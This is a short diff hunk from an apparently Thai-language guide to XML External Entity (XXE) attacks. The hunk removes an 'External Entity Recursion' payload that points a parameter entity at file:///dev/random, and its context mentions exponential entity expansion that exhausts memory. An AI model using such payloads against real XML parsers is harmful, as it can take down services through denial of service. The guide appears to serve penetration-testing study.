@@ -270,16 +270,6 @@ XXE แบบธรรมดาที่เห็น output ของ external e
 ```
 **หมายเหตุ:** Entity นี้จะ expand แบบ exponential ทำให้ memory หมด
 
-**External Entity Recursion:**
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE root [
-  <!ENTITY % a SYSTEM "file:///dev/random">
-  %a;
-]>
-<root></root>
-```
-
 ## 🚪 Advanced Techniques
 
 ### SVG File XXE
